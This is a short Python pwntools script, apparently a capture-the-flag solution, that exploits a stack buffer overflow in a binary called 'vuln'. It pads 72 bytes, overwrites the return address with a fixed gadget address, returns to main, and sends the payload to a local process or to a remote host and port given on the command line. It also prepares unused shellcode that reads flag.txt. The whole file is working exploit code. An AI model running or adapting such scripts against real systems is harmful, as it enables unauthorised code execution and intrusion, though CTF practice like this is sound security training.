#!/usr/bin/python3

import pwn
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", help="Enter the host")
parser.add_argument("--port", "-p", type=int, default=0, help="Enter the port")
args = parser.parse_args()
elf = pwn.ELF('./vuln')

new_eip = pwn.p64(0x40123b)#https://superuser.com/questions/168114/how-much-memory-can-a-64bit-machine-address-at-a-time 
return_main = pwn.p64(elf.symbols['main'])
shell_craft = pwn.asm(pwn.shellcraft.linux.cat("flag.txt"))
offset = 72
payload = b"".join([
        b"A"*offset,
        new_eip,
        return_main,
])
payload += b"\n" # press enter
print(payload)
if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    if not args.target or not args.port:
        pwn.warning("Please provide target and port to connect to remote server")
        exit()
    p = pwn.remote(args.target, args.port)
p.sendline(payload)
print(p.recvall().decode("utf-8"))
